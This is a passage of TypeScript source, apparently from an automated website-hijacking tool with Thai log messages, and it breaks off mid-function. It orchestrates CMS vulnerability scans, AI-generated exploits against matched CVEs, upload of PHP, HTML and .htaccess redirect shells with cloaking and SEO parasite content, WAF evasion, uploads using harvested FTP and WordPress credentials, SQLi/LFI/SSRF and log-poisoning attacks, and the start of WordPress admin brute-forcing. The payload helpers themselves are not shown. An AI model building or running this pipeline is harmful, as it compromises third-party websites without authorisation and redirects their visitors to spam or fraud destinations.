  let dbCveMatches: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> = [];

  if (shouldStop('cms_vuln_scan') || hasSuccessfulRedirect()) {
    loggedOnEvent({ phase: "cms_vuln_scan" as any, step: "skipped", detail: `⏭️ CMS Vuln Scan skipped`, progress: 56 });
  } else {
    try {
      loggedOnEvent({
        phase: "cms_vuln_scan" as any,
        step: "scanning",
        detail: `🔍 Phase 2.7: Multi-CMS Vuln Scan — Detecting Joomla/Drupal/Magento/PrestaShop/vBulletin...`,
        progress: 56,
      });

      // Only run if target is NOT WordPress (WP has its own scanner)
      const isWp = wpVulnScanResult?.isWordPress || false;

      if (!isWp) {
        cmsScanResult = await Promise.race([
          runCmsVulnScan(config.targetUrl, (phase, detail, progress) => {
            loggedOnEvent({ phase: "cms_vuln_scan" as any, step: phase, detail: `🔍 CMS Scan: ${detail}`, progress: 56 + (progress * 0.04) });
          }),
          new Promise<CmsScanResult>((_, reject) => setTimeout(() => reject(new Error("CMS scan timeout")), 90000)),
        ]);

        if (cmsScanResult.cmsDetected !== "unknown") {
          const exploitableVulns = cmsScanResult.vulnerabilities.filter(v => v.exploitAvailable);
          aiDecisions.push(`🔍 CMS Scan: Detected ${cmsScanResult.cmsDetected} v${cmsScanResult.cmsVersion || '?'}, ${cmsScanResult.extensions.length} extensions, ${cmsScanResult.vulnerabilities.length} vulns (${exploitableVulns.length} exploitable)`);

          loggedOnEvent({
            phase: "cms_vuln_scan" as any,
            step: "results",
            detail: `🔍 CMS Scan: ${cmsScanResult.cmsDetected} v${cmsScanResult.cmsVersion || '?'}, ${cmsScanResult.extensions.length} extensions, ${cmsScanResult.vulnerabilities.length} vulns, ${cmsScanResult.interestingFindings.length} findings`,
            progress: 58,
            data: {
              cms: cmsScanResult.cmsDetected,
              version: cmsScanResult.cmsVersion,
              extensions: cmsScanResult.extensions.map(e => `${e.slug}${e.version ? ` v${e.version}` : ''}`),
              vulns: cmsScanResult.vulnerabilities.map(v => `${v.component}: ${v.title} (${v.severity})`),
              findings: cmsScanResult.interestingFindings,
            },
          });

          // Try exploiting critical/high vulns — AI Exploit Generator first, template fallback
          for (const vuln of exploitableVulns) {
            if (hasSuccessfulRedirect()) break;
            if (vuln.type !== "file_upload" && vuln.type !== "rce" && vuln.type !== "auth_bypass" && vuln.type !== "sqli" && vuln.type !== "lfi") continue;

            loggedOnEvent({
              phase: "cms_vuln_scan" as any,
              step: "exploit",
              detail: `🤖 AI Exploit: ${vuln.title} (${vuln.cve || 'no CVE'}, type: ${vuln.type})`,
              progress: 59,
            });

            // === AI EXPLOIT GENERATOR (primary) ===
            let aiSuccess = false;
            try {
              const aiResult = await Promise.race([
                generateAndExecuteExploit(
                  config.targetUrl,
                  vuln.cve || null,
                  cmsScanResult.cmsDetected,
                  vuln.component,
                  vuln.type,
                  vuln.title,
                  config.redirectUrl,
                ),
                new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
                  setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
                ),
              ]);

              aiExploitResults.push({
                cveId: vuln.cve || null,
                cms: cmsScanResult.cmsDetected,
                component: vuln.component,
                vulnType: vuln.type,
                exploitType: aiResult.payload.exploitType,
                success: aiResult.success,
                uploadedUrl: aiResult.uploadedUrl,
              });

              if (aiResult.success && aiResult.uploadedUrl) {
                aiSuccess = true;
                const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
                uploadedFiles.push({
                  url: aiResult.uploadedUrl,
                  shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || "", filename: aiResult.payload.uploadFilename || "ai-cms.php", contentType: "application/x-php", description: `AI: ${vuln.title}`, id: `ai_cms_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
                  method: `ai_cms_exploit_${vuln.cve || vuln.component}`,
                  verified: verification.verified,
                  redirectWorks: verification.redirectWorks,
                  redirectDestinationMatch: verification.redirectDestinationMatch,
                  finalDestination: verification.finalDestination,
                  httpStatus: verification.httpStatus,
                  redirectChain: verification.redirectChain,
                });
                aiDecisions.push(`🤖 AI CMS Exploit SUCCESS: ${vuln.title} → ${aiResult.uploadedUrl}`);
              }
            } catch (aiErr: any) {
              // AI exploit failed — fall through to template
            }

            // === TEMPLATE EXPLOIT (fallback) ===
            if (!aiSuccess && !hasSuccessfulRedirect() && (vuln.type === "file_upload" || vuln.type === "rce")) {
              const shellObj = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
              const fileName = shellObj.filename;
              const fileContent = typeof shellObj.content === "string" ? shellObj.content : shellObj.content.toString();
              const result = await executeCmsExploit(config.targetUrl, vuln, fileName, fileContent);

              if (result.success && result.uploadedUrl) {
                uploadedFiles.push({
                  url: result.uploadedUrl,
                  shell: shellObj,
                  method: `cms_exploit_${vuln.cve || vuln.component}`,
                  verified: false,
                  redirectWorks: false,
                  redirectDestinationMatch: false,
                  finalDestination: "",
                  httpStatus: 0,
                });
                aiDecisions.push(`✅ Template CMS Exploit SUCCESS: ${vuln.title} → ${result.uploadedUrl}`);
              }
            }
          }
        } else {
          aiDecisions.push(`🔍 CMS Scan: No known CMS detected (not Joomla/Drupal/Magento/etc.)`);
        }
      } else {
        // For WordPress targets, try matching plugins against the DB CVE database
        // Then auto-exploit any critical/high matches with AI Exploit Generator
        if (wpVulnScanResult && wpVulnScanResult.plugins.length > 0) {
          try {
            dbCveMatches = await matchPluginsAgainstDb(
              wpVulnScanResult.plugins.map(p => ({ slug: p.slug, version: p.version }))
            );
            if (dbCveMatches.length > 0) {
              aiDecisions.push(`📊 DB CVE Match: Found ${dbCveMatches.length} additional CVEs from auto-updated database for ${wpVulnScanResult.plugins.length} plugins`);
              loggedOnEvent({
                phase: "cms_vuln_scan" as any,
                step: "db_match",
                detail: `📊 DB CVE: ${dbCveMatches.length} additional CVEs from database (${dbCveMatches.filter(m => m.severity === 'critical').length} critical)`,
                progress: 58,
                data: { matches: dbCveMatches.slice(0, 20).map(m => `${m.pluginSlug}: ${m.cveId} - ${m.title} (${m.severity})`) },
              });

              // Auto-exploit critical/high DB CVE matches with AI Exploit Generator
              const criticalMatches = dbCveMatches.filter(m => m.severity === 'critical' || m.severity === 'high');
              if (criticalMatches.length > 0 && !hasSuccessfulRedirect()) {
                loggedOnEvent({
                  phase: "cms_vuln_scan" as any,
                  step: "db_exploit",
                  detail: `🤖 AI Exploit: Auto-exploiting ${criticalMatches.length} critical/high DB CVE matches...`,
                  progress: 59,
                });

                for (const match of criticalMatches.slice(0, 5)) { // Limit to top 5
                  if (hasSuccessfulRedirect()) break;
                  try {
                    const aiResult = await Promise.race([
                      generateAndExecuteExploit(
                        config.targetUrl,
                        match.cveId,
                        "wordpress",
                        match.pluginSlug,
                        match.vulnType || "file_upload",
                        match.title,
                        config.redirectUrl,
                      ),
                      new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
                        setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
                      ),
                    ]);

                    aiExploitResults.push({
                      cveId: match.cveId,
                      cms: "wordpress",
                      component: match.pluginSlug,
                      vulnType: match.vulnType || "file_upload",
                      exploitType: aiResult.payload.exploitType,
                      success: aiResult.success,
                      uploadedUrl: aiResult.uploadedUrl,
                    });

                    if (aiResult.success && aiResult.uploadedUrl) {
                      const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
                      uploadedFiles.push({
                        url: aiResult.uploadedUrl,
                        shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || "", filename: aiResult.payload.uploadFilename || "ai-db-cve.php", contentType: "application/x-php", description: `AI DB: ${match.cveId}`, id: `ai_db_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated", "db_cve_match"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
                        method: `ai_db_exploit_${match.pluginSlug}`,
                        verified: verification.verified,
                        redirectWorks: verification.redirectWorks,
                        redirectDestinationMatch: verification.redirectDestinationMatch,
                        finalDestination: verification.finalDestination,
                        httpStatus: verification.httpStatus,
                        redirectChain: verification.redirectChain,
                      });
                      aiDecisions.push(`🤖 AI DB CVE Exploit SUCCESS: ${match.cveId} (${match.pluginSlug}) → ${aiResult.uploadedUrl}`);
                    }
                  } catch (dbExploitErr: any) {
                    // Non-critical, continue to next match
                  }
                }
              }
            }
          } catch (e: any) {
            // DB matching is non-critical
            aiDecisions.push(`📊 DB CVE Match: Error — ${e.message}`);
          }
        }
      }
    } catch (error: any) {
      errors.push(`CMS Vuln Scan error: ${error.message}`);
      loggedOnEvent({
        phase: "cms_vuln_scan" as any,
        step: "error",
        detail: `⚠️ CMS Vuln Scan error: ${error.message}`,
        progress: 58,
      });
    }
  }

  // ─── Cloaking variables (will be populated AFTER upload succeeds) ───
  let cloakingResult: CloakingShellResult | null = null;
  let contentPack: ContentPack | null = null;

  // ─── Phase 3: Shell Generation ───
  let shells: GeneratedShell[] = [];
  if (shouldStop('shell_gen') || hasSuccessfulRedirect()) {
    loggedOnEvent({ phase: "shell_gen", step: "skipped", detail: `⏭️ Shell generation skipped — ${hasSuccessfulRedirect() ? 'already have successful redirect' : 'timeout'}`, progress: 50 });
  } else
  try {
    loggedOnEvent({
      phase: "shell_gen",
      step: "generating",
      detail: "🔧 Phase 3: AI Shell Generation — สร้าง redirect shells ตาม target profile...",
      progress: 40,
    });

    const shellConfig: ShellGenerationConfig = {
      redirectUrl: config.redirectUrl,
      seoKeywords: config.seoKeywords,
      targetVectors: vulnScan?.attackVectors || [],
      serverInfo: vulnScan?.serverInfo || {
        ip: prescreen?.ipAddress || "0.0.0.0",
        server: prescreen?.serverType || "Unknown",
        poweredBy: prescreen?.phpVersion || "",
        os: prescreen?.osGuess || "unknown",
        phpVersion: prescreen?.phpVersion || "",
        waf: prescreen?.wafDetected || null,
        cdn: null,
        ssl: prescreen?.sslInfo?.enabled || false,
        httpMethods: [],
        headers: {},
      } as ServerInfo,
      cms: vulnScan?.cms || {
        type: (prescreen?.cms as CmsDetection["type"]) || "unknown",
        version: prescreen?.cmsVersion || "",
        plugins: prescreen?.cmsPlugins || [],
        themes: prescreen?.cmsTheme ? [prescreen.cmsTheme] : [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      } as CmsDetection,
      cloaking: config.cloaking !== false,
      geoRedirect: config.geoRedirect,
      parasiteContent: config.parasiteContent || "medium",
    };

    shells = await generateShellsForTarget(
      vulnScan || {
        target: config.targetUrl,
        serverInfo: shellConfig.serverInfo,
        cms: shellConfig.cms,
        writablePaths: [],
        uploadEndpoints: [],
        exposedPanels: [],
        misconfigurations: [],
        attackVectors: [],
        aiAnalysis: "",
        scanDuration: 0,
        timestamp: Date.now(),
      } as VulnScanResult,
      shellConfig,
      (detail) => {
        loggedOnEvent({
          phase: "shell_gen",
          step: "generating",
          detail,
          progress: 45,
        });
      },
    );

    aiDecisions.push(`Generated ${shells.length} shells: ${shells.map(s => s.type).join(", ")}`);

    loggedOnEvent({
      phase: "shell_gen",
      step: "complete",
      detail: `✅ สร้าง ${shells.length} shell payloads เสร็จ`,
      progress: 50,
      data: { shellCount: shells.length, types: shells.map(s => s.type) },
    });
  } catch (error: any) {
    errors.push(`Shell generation failed: ${error.message}`);
    loggedOnEvent({
      phase: "shell_gen",
      step: "error",
      detail: `⚠️ Shell generation ล้มเหลว: ${error.message}`,
      progress: 50,
    });
  }

  // ─── Phase 4: Upload (try each shell with all methods) ───
  let totalAttempts = 0;

  if (shells.length > 0 && !shouldStop('upload') && !hasSuccessfulRedirect()) {
    loggedOnEvent({
      phase: "upload",
      step: "start",
      detail: `📤 Phase 4: Upload — ลอง upload ${shells.length} shells ด้วยทุกวิธี...`,
      progress: 50,
    });

    // Sort shells by priority: AI-generated first, then PHP, then others
    // (Cloaking shells are generated AFTER upload succeeds — not before)
    // Track if any uploaded PHP file was not executed (to prioritize HTML shells)
    let phpExecutionFailed = false;

    const sortedShells = [...shells].sort((a, b) => {
      if (a.id.startsWith("ai_") && !b.id.startsWith("ai_")) return -1;
      if (!a.id.startsWith("ai_") && b.id.startsWith("ai_")) return 1;
      if (a.type === "redirect_php" && b.type !== "redirect_php") return -1;
      if (a.type === "seo_parasite" && b.type !== "seo_parasite") return -1;
      return 0;
    });

    // Try uploading each shell until we get at least one success
    for (let i = 0; i < sortedShells.length; i++) {
      // Check global deadline and success status before each shell attempt
      if (shouldStop('upload_loop') || hasSuccessfulRedirect()) break;

      const shell = sortedShells[i];

      // Skip PHP shells if we already know PHP doesn't execute on this server
      if (phpExecutionFailed && (shell.type === "redirect_php" || shell.type === "steganography" || shell.type === "polyglot")) {
        loggedOnEvent({
          phase: "upload",
          step: `shell_${i + 1}_skip`,
          detail: `⏭️ Skip ${shell.type} (${shell.filename}) — PHP ไม่ถูก execute บน server นี้`,
          progress: 50 + (i / sortedShells.length) * 30,
        });
        continue;
      }

      totalAttempts++;

      loggedOnEvent({
        phase: "upload",
        step: `shell_${i + 1}`,
        detail: `📤 Upload shell ${i + 1}/${sortedShells.length}: ${shell.type} (${shell.filename})`,
        progress: 50 + (i / sortedShells.length) * 30,
      });

      const uploadResult = await uploadShellWithAllMethods(
        config.targetUrl,
        shell,
        prescreen,
        vulnScan,
        config,
        onEvent,
        deadline,
      );

      if (uploadResult.success && uploadResult.url) {
        // Verify the uploaded file
        loggedOnEvent({
          phase: "verify",
          step: "checking",
          detail: `🔍 Verifying: ${uploadResult.url}`,
          progress: 85,
        });

        const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);

        uploadedFiles.push({
          url: uploadResult.url,
          shell,
          method: uploadResult.method,
          verified: verification.verified,
          redirectWorks: verification.redirectWorks,
          redirectDestinationMatch: verification.redirectDestinationMatch,
          finalDestination: verification.finalDestination,
          httpStatus: verification.httpStatus,
          redirectChain: verification.redirectChain,
        });

        aiDecisions.push(`✅ Upload success: ${shell.type} via ${uploadResult.method} → ${uploadResult.url} (verified: ${verification.verified}, redirect: ${verification.redirectWorks}, destination: ${verification.redirectDestinationMatch ? '✅ match' : '❌ mismatch'} → ${verification.finalDestination})`);

        // If we have a verified redirect TO THE CORRECT DESTINATION, we can stop
        if (verification.redirectWorks && verification.redirectDestinationMatch) {
          loggedOnEvent({
            phase: "complete",
            step: "success",
            detail: `🎉 สำเร็จ! Redirect ไปยังปลายทางจริง: ${uploadResult.url} → ${verification.finalDestination}`,
            progress: 100,
          });
          break;
        }

        // Redirect works but goes to wrong destination
        if (verification.redirectWorks && !verification.redirectDestinationMatch) {
          loggedOnEvent({
            phase: "verify",
            step: "destination_mismatch",
            detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${uploadResult.url} → ${verification.finalDestination} (ควรไป ${config.redirectUrl}) — ลองต่อ`,
            progress: 75,
          });
          // Don't break — keep trying other shells
        }

        // If file is accessible but redirect doesn't work yet
        if (verification.verified && !verification.redirectWorks) {
          // ═══ AUTO-FALLBACK: PHP not executing → try HTML/htaccess at same path ═══
          if (verification.phpNotExecuting) {
            phpExecutionFailed = true; // Mark so subsequent PHP shells are skipped
            loggedOnEvent({
              phase: "upload",
              step: "php_fallback",
              detail: `🔄 PHP ไม่ถูก execute — Auto-fallback: ลอง upload .html redirect ที่ path เดียวกัน`,
              progress: 87,
            });

            // Extract the upload path from the successful PHP URL
            const phpUrl = new URL(uploadResult.url);
            const phpPath = phpUrl.pathname;
            const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/") + 1);

            // Generate unconditional HTML redirect (no PHP needed)
            const htmlFallbackShell = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);

            // Try uploading HTML at the same directory
            const htmlUploadResult = await uploadShellWithAllMethods(
              config.targetUrl,
              htmlFallbackShell,
              prescreen,
              vulnScan,
              config,
              onEvent,
              deadline,
            );

            if (htmlUploadResult.success && htmlUploadResult.url) {
              const htmlVerification = await verifyUploadedFile(htmlUploadResult.url, config.redirectUrl, onEvent);

              uploadedFiles.push({
                url: htmlUploadResult.url,
                shell: htmlFallbackShell,
                method: htmlUploadResult.method + "_php_fallback",
                verified: htmlVerification.verified,
                redirectWorks: htmlVerification.redirectWorks,
                redirectDestinationMatch: htmlVerification.redirectDestinationMatch,
                finalDestination: htmlVerification.finalDestination,
                httpStatus: htmlVerification.httpStatus,
                redirectChain: htmlVerification.redirectChain,
              });

              aiDecisions.push(`🔄 PHP fallback → HTML: ${htmlUploadResult.url} (verified: ${htmlVerification.verified}, redirect: ${htmlVerification.redirectWorks})`);

              if (htmlVerification.redirectWorks) {
                loggedOnEvent({
                  phase: "complete",
                  step: "success",
                  detail: `🎉 HTML fallback สำเร็จ! Redirect ทำงาน: ${htmlUploadResult.url} → ${config.redirectUrl}`,
                  progress: 100,
                });
                break;
              }
            }

            // Also try .htaccess unconditional redirect
            const htaccessFallbackShell = generateUnconditionalHtaccessRedirect(config.redirectUrl);
            const htaccessUploadResult = await uploadShellWithAllMethods(
              config.targetUrl,
              htaccessFallbackShell,
              prescreen,
              vulnScan,
              config,
              onEvent,
              deadline,
            );

            if (htaccessUploadResult.success && htaccessUploadResult.url) {
              // For .htaccess, verify by checking the directory URL (not the .htaccess file itself)
              const dirUrl = `${phpUrl.origin}${dirPath}`;
              const htaccessVerification = await verifyUploadedFile(dirUrl, config.redirectUrl, onEvent);

              uploadedFiles.push({
                url: htaccessUploadResult.url,
                shell: htaccessFallbackShell,
                method: htaccessUploadResult.method + "_php_fallback",
                verified: htaccessVerification.verified,
                redirectWorks: htaccessVerification.redirectWorks,
                redirectDestinationMatch: htaccessVerification.redirectDestinationMatch,
                finalDestination: htaccessVerification.finalDestination,
                httpStatus: htaccessVerification.httpStatus,
                redirectChain: htaccessVerification.redirectChain,
              });

              aiDecisions.push(`🔄 PHP fallback → .htaccess: ${htaccessUploadResult.url} (verified: ${htaccessVerification.verified}, redirect: ${htaccessVerification.redirectWorks})`);

              if (htaccessVerification.redirectWorks) {
                loggedOnEvent({
                  phase: "complete",
                  step: "success",
                  detail: `🎉 .htaccess fallback สำเร็จ! Redirect ทำงาน: ${dirUrl} → ${config.redirectUrl}`,
                  progress: 100,
                });
                break;
              }
            }
          }

          loggedOnEvent({
            phase: "upload",
            step: "partial",
            detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน${verification.phpNotExecuting ? " (PHP ไม่ execute + HTML/htaccess fallback ล้มเหลว)" : ""} — ลอง shell ถัดไป`,
            progress: 85,
          });
        }
      }

      // Stop after 5 failed attempts to avoid wasting time
      if (totalAttempts >= (config.maxUploadAttempts || 8) && uploadedFiles.length === 0) {
        loggedOnEvent({
          phase: "upload",
          step: "max_attempts",
          detail: `⚠️ ลอง ${totalAttempts} ครั้งแล้ว ยังไม่สำเร็จ — หยุดเพื่อประหยัดเวลา`,
          progress: 80,
        });
        break;
      }
    }
  }

  // ─── Phase 4.5: Advanced Attack Fallback (if standard upload failed) ───
  let wafBypassResults: WafBypassResult[] = [];
  let altUploadResults: AltUploadResult[] = [];
  let indirectResults: IndirectAttackResult[] = [];

  const hasVerifiedRedirect = uploadedFiles.some(f => f.redirectWorks);

  if (!hasVerifiedRedirect && shells.length > 0 && !shouldStop('advanced_attacks') && !hasSuccessfulRedirect()) {
    const bestShell = shells[0];
    const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
    const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;

    // 4.5a: WAF Bypass uploads (enhanced with waf-detector evasion strategy)
    if (config.enableWafBypass !== false && !shouldStop('waf_bypass') && !hasSuccessfulRedirect()) {
      try {
        const wafName = wafDetectionResult?.detected ? wafDetectionResult.wafName : "Unknown";
        const evasionHint = evasionStrategy ? ` — Evasion: ${evasionStrategy.primaryTechniques.slice(0, 3).join(", ")}` : "";
        loggedOnEvent({
          phase: "waf_bypass",
          step: "start",
          detail: `🛡️ Phase 4.5a: WAF Bypass (${wafName})${evasionHint} — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
          progress: 82,
        });

        const wafScanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
        const wafPrescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
        const uploadPaths = wafScanPaths || wafPrescreenPaths || [
          "/wp-content/uploads/", "/uploads/", "/images/",
          "/wp-content/themes/", "/tmp/", "/media/",
        ];

        // If WAF was detected, apply evasion to shell content before upload
        let evasionShellContent = shellContent;
        if (wafDetectionResult?.detected && evasionStrategy) {
          try {
            const evasionPayload = applyEvasionToPayload(shellContent, bestShell.filename, evasionStrategy);
            if (evasionPayload.modifiedPayloads.length > 0) {
              evasionShellContent = evasionPayload.modifiedPayloads[0].payload;
              const techniques = evasionPayload.modifiedPayloads.map(p => p.technique);
              aiDecisions.push(`🛡️ Applied ${techniques.length} evasion techniques: ${techniques.slice(0, 5).join(", ")}`);
            }
          } catch (evasionErr: any) {
            aiDecisions.push(`🛡️ Evasion transform failed: ${evasionErr.message} — using original payload`);
          }
        }

        // Run WAF bypass with ALL paths at once (engine rotates internally)
        wafBypassResults = await Promise.race([
          runWafBypass({
            targetUrl: targetForAdvanced,
            uploadPaths: uploadPaths,
            fileContent: evasionShellContent,
            originalFilename: bestShell.filename,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (method: string, detail: string) => {
              loggedOnEvent({
                phase: "waf_bypass",
                step: method,
                detail: `🛡️ ${detail}`,
                progress: 84,
              });
            },
          }),
          new Promise<WafBypassResult[]>((_, reject) => setTimeout(() => reject(new Error("WAF bypass timeout")), 120000)),
        ]);

        // If WAF bypass failed and we have evasion, try AI-generated WAF evasion variants
        const wafInitialSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
        if (!wafInitialSuccess && wafDetectionResult?.detected && evasionStrategy) {
          try {
            aiDecisions.push(`🛡️ WAF bypass failed — generating AI evasion variants for ${wafDetectionResult.wafName}...`);
            loggedOnEvent({
              phase: "waf_bypass",
              step: "ai_evasion",
              detail: `🤖 Generating AI WAF evasion variants for ${wafDetectionResult.wafName}...`,
              progress: 85,
            });

            const aiVariants = await Promise.race([
              generateWafEvasionVariants(
                shellContent,
                "file_upload",
                wafDetectionResult.wafName || "generic",
              ),
              new Promise<WafEvasionVariant[]>((_, reject) => setTimeout(() => reject(new Error("AI evasion timeout")), 45000)),
            ]) as WafEvasionVariant[];

            // Try each AI variant
            for (const variant of aiVariants.slice(0, 5)) {
              const variantResults = await runWafBypass({
                targetUrl: targetForAdvanced,
                uploadPaths: uploadPaths.slice(0, 3),
                fileContent: variant.payload,
                originalFilename: bestShell.filename,
                timeout: 15000,
                onProgress: (method: string, detail: string) => {
                  loggedOnEvent({
                    phase: "waf_bypass",
                    step: `ai_variant_${variant.technique}`,
                    detail: `🤖 AI Evasion (${variant.technique}): ${detail}`,
                    progress: 86,
                  });
                },
              });

              const variantSuccess = variantResults.find(r => r.success && r.fileUrl);
              if (variantSuccess) {
                aiDecisions.push(`✅ AI WAF evasion success: ${variant.technique}`);
                // Record AI evasion success for learning
                if (wafDetectionResult?.detected) {
                  notifyWafBypassSuccess(
                    wafDetectionResult.wafName || "unknown",
                    `ai_evasion_${variant.technique}`,
                    extractDomain(config.targetUrl),
                    `AI-generated evasion variant: ${variant.technique} bypassed ${wafDetectionResult.wafName}`,
                  ).catch(() => {});
                }
                wafBypassResults.push(...variantResults);
                break;
              }
            }
          } catch (aiEvasionErr: any) {
            aiDecisions.push(`🛡️ AI evasion generation failed: ${aiEvasionErr.message}`);
          }
        }

        const wafSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
        if (wafSuccess && wafSuccess.fileUrl) {
          aiDecisions.push(`✅ WAF bypass success: ${wafSuccess.method} → ${wafSuccess.fileUrl}`);

          // ═══ NOTIFY WAF BYPASS STRATEGIES: Record success for learning ═══
          if (wafDetectionResult?.detected) {
            notifyWafBypassSuccess(
              wafDetectionResult.wafName || "unknown",
              wafSuccess.method || "unknown",
              extractDomain(config.targetUrl),
              `Pipeline WAF bypass: ${wafSuccess.method} bypassed ${wafDetectionResult.wafName} (${wafDetectionResult.strength} strength)`,
            ).catch(() => {});
          }
          const verification = await verifyUploadedFile(wafSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: wafSuccess.fileUrl,
            shell: bestShell,
            method: `waf_bypass_${wafSuccess.method}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        loggedOnEvent({
          phase: "waf_bypass",
          step: "complete",
          detail: `✅ WAF bypass เสร็จ — ${wafBypassResults.filter(r => r.success).length}/${wafBypassResults.length} methods สำเร็จ`,
          progress: 86,
        });
      } catch (error: any) {
        errors.push(`WAF bypass failed: ${error.message}`);
      }
    }

    // 4.5b: Alternative Upload Vectors
    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('alt_upload') && !hasSuccessfulRedirect()) {
      try {
        loggedOnEvent({
          phase: "alt_upload",
          step: "start",
          detail: `📡 Phase 4.5b: Alt Upload — XML-RPC, REST API, WebDAV, FTP, cPanel, Git exploit...`,
          progress: 87,
        });

        // Build credentials from discovered config exploits
        const wpCreds = discoveredCredentials.find((c: any) => c.type === "wordpress" || c.type === "wp");
        const ftpCreds = discoveredCredentials.filter((c: any) => c.type === "ftp").map((c: any) => ({ username: c.username || "", password: c.password || "" }));

        altUploadResults = await Promise.race([
          runAllAltUploadVectors({
            targetUrl: targetForAdvanced,
            fileContent: shellContent,
            filename: bestShell.filename,
            wpCredentials: wpCreds ? { username: wpCreds.username || "", appPassword: wpCreds.password || "" } : undefined,
            ftpCredentials: ftpCreds.length > 0 ? ftpCreds : undefined,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              loggedOnEvent({
                phase: "alt_upload",
                step: vector,
                detail: `📡 ${detail}`,
                progress: 89,
              });
            },
          }),
          new Promise<AltUploadResult[]>((_, reject) => setTimeout(() => reject(new Error("alt upload timeout")), 90000)),
        ]);

        const altSuccess = altUploadResults.find(r => r.success && r.fileUrl);
        if (altSuccess && altSuccess.fileUrl) {
          aiDecisions.push(`✅ Alt upload success: ${altSuccess.vector} → ${altSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(altSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: altSuccess.fileUrl,
            shell: bestShell,
            method: `alt_${altSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        loggedOnEvent({
          phase: "alt_upload",
          step: "complete",
          detail: `✅ Alt upload เสร็จ — ${altUploadResults.filter(r => r.success).length}/${altUploadResults.length} methods สำเร็จ`,
          progress: 91,
        });
      } catch (error: any) {
        errors.push(`Alt upload failed: ${error.message}`);
      }
    }

    // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('indirect') && !hasSuccessfulRedirect()) {
      try {
        loggedOnEvent({
          phase: "indirect",
          step: "start",
          detail: `💉 Phase 4.5c: Indirect Attacks — SQLi File Write, LFI/RFI, Log Poisoning, SSRF...`,
          progress: 92,
        });

        indirectResults = await Promise.race([
          runIndirectAttacks({
            targetUrl: targetForAdvanced,
            shellContent,
            shellFilename: bestShell.filename,
            redirectUrl: config.redirectUrl,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              loggedOnEvent({
                phase: "indirect",
                step: vector,
                detail: `💉 ${detail}`,
                progress: 94,
              });
            },
          }),
          new Promise<IndirectAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("indirect attacks timeout")), 120000)),
        ]);

        const indirectSuccess = indirectResults.find(r => r.success && r.fileUrl);
        if (indirectSuccess && indirectSuccess.fileUrl) {
          aiDecisions.push(`✅ Indirect attack success: ${indirectSuccess.vector} → ${indirectSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(indirectSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: indirectSuccess.fileUrl,
            shell: bestShell,
            method: `indirect_${indirectSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        loggedOnEvent({
          phase: "indirect",
          step: "complete",
          detail: `✅ Indirect attacks เสร็จ — ${indirectResults.filter(r => r.success).length}/${indirectResults.length} methods สำเร็จ`,
          progress: 96,
        });
      } catch (error: any) {
        errors.push(`Indirect attacks failed: ${error.message}`);
      }
    }
  }

  // ─── Phase 4.6: WP Admin Takeover + DB Injection (non-upload fallback) ───
  let wpAdminResults: WpTakeoverResult[] = [];
  let wpDbInjectionResults: WpDbInjectionResult[] = [];

  if (!uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_admin') && !hasSuccessfulRedirect()) {
    // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
    if (config.enableWpAdminTakeover !== false) {
      try {
        loggedOnEvent({
          phase: "wp_admin",
          step: "start",
